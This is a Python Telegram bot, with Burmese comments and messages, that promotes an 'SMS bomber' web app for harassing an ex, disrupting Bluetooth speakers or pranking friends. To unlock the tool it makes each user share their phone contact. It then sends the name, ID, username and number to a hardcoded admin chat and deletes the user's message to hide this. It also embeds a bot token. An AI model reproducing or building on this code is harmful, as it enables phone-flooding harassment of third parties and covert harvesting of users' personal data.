import asyncio
from telegram import KeyboardButton, ReplyKeyboardMarkup, Update, WebAppInfo
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes

BOT_TOKEN = "8201360751:AAGay7Fene2IQVSHujS28m9K9KKw-Nx-Rn4"
ADMIN_CHAT_ID = 7968044907

# ရှယ်ပြီးသား user များ
shared_users = set()

async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    print(f"Start command from {user_id}")

    # ရှယ်ပြီးသားဆို OPEN ခလုတ်ပြမယ်
    if user_id in shared_users:
        open_btn = KeyboardButton("Open Mega Sms Bomber🎃", web_app=WebAppInfo(url="https://megasmsbomber.netlify.app"))
        keyboard = ReplyKeyboardMarkup([[open_btn]], resize_keyboard=True)
        await update.message.reply_text(" Open Sms Bomber ကိုနိပ်ပြီးအသုံးပြုနိုင်ပါပြဖိ", reply_markup=keyboard)
        return

    # မရှယ်ရသေးရင် ဖုန်းနံပါတ်မျှဝေရန် ခလုတ်ပြမယ်
    share_btn = KeyboardButton("Mega Sms Bomberအားစတင်လိုက်ပါ🎃။", request_contact=True)
    keyboard = ReplyKeyboardMarkup([[share_btn]], resize_keyboard=True, one_time_keyboard=True)
    await update.message.reply_text("Ex ကို ဒုက္ခပေးချင်သလား? Bluetooth Box တေကိုနှောက်ရှက်မလား?ဂိမ်းတော့နေတဲ့ကို့သူငယ်ချင်းကို စမလား ဒီလိုဆိုရင်တော့ Megan Sms Bomber လေးကိုခုပဲသုံးကြည့်လိုက်ပါ🎃", reply_markup=keyboard)

async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    user_id = user.id
    print(f"Contact received from {user_id}")

    # ရှယ်ပြီးသားဆို ဘာမှမလုပ်တော့ဘူး
    if user_id in shared_users:
        print(f"User {user_id} already shared, ignoring.")
        return

    contact = update.message.contact
    phone = contact.phone_number
    name = contact.first_name
    username = f"@{user.username}" if user.username else "No username"

    # 1. Admin ဆီ ပို့မယ်
    await context.bot.send_message(
        chat_id=ADMIN_CHAT_ID,
        text=f"📞 New Phone Number\nName: {name}\nID: {user_id}\nUsername: {username}\nPhone: {phone}"
    )

    # 2. User ဆီက phone number message ကို ဖျက်မယ်
    try:
        await update.message.delete()
        print(f"Deleted message for {user_id}")
    except Exception as e:
        print(f"Delete failed: {e}")

    # 3. User ကို shared set ထဲထည့်မယ်
    shared_users.add(user_id)

    # 4. OPEN ခလုတ်ကို ချက်ချင်းပြမယ် (web app ပါတယ်)
    open_btn = KeyboardButton("Open Mega Bomber☠️", web_app=WebAppInfo(url="https://megasmsbomber.netlify.app"))
    keyboard = ReplyKeyboardMarkup([[open_btn]], resize_keyboard=True)
    
    # စာတိုလေးနဲ့အတူ keyboard ကို ပို့မယ် (ဒါမှ user မြင်ရမယ်)
    await update.message.reply_text(
        "Open Sms Bomber ကိုနိပ်ပြီးအသုံးပြုနိုင်ပါပြီ🎃",
        reply_markup=keyboard
    )

    # Admin ကို success ပို့မယ် (debug)
    await context.bot.send_message(chat_id=ADMIN_CHAT_ID, text=f"✅ User {user_id} got OPEN button.")

def main():
    app = Application.builder().token(BOT_TOKEN).build()
    app.add_handler(CommandHandler("start", start))
    app.add_handler(MessageHandler(filters.CONTACT, contact_handler))

    print("Bot started...")
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
